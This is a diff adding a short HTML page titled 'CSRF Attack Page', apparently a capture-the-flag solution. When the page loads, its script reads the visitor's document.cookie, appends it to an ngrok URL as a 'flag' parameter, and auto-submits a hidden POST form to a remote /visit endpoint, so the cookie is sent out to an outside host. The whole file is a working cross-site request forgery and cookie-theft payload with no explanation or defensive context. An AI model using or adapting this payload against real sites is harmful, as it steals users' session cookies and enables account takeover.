@@ -1,0 +1,17 @@
+<!DOCTYPE HTML>
+<html>
+  <head>
+    <title>CSRF Attack Page</title>
+  </head>
+  <body>
+    <form method="POST" action="http://13.38.208.179:14696/visit" id="csrf-form">
+      <input id="input_field" type="hidden" name="url" value="https://ec6f-109-138-53-168.ngrok-free.app" />
+    </form>
+    <script>
+      window.onload = function(){
+        document.getElementById('input_field').value = `https://ec6f-109-138-53-168.ngrok-free.app?flag=${encodeURIComponent(document.cookie)}`;
+        document.getElementById('csrf-form').submit();
+      }
+    </script>
+  </body>
+</html>
